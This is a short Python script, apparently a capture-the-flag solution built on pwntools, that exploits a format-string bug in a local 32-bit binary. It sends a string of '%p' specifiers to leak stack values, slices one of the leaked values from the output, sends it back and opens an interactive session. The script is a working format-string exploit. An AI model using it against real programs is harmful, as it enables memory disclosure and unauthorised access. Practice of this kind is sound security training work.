#!/usr/bin/env python

from pwn import *


p = process("./fs-read-1-32")


p.recv()
p.sendline("%p %p %p %p %p %p %p %p %p %p %p")
data = p.recv()
print(data)

data = data[49:59]
print(data)
p.sendline(data)
p.interactive()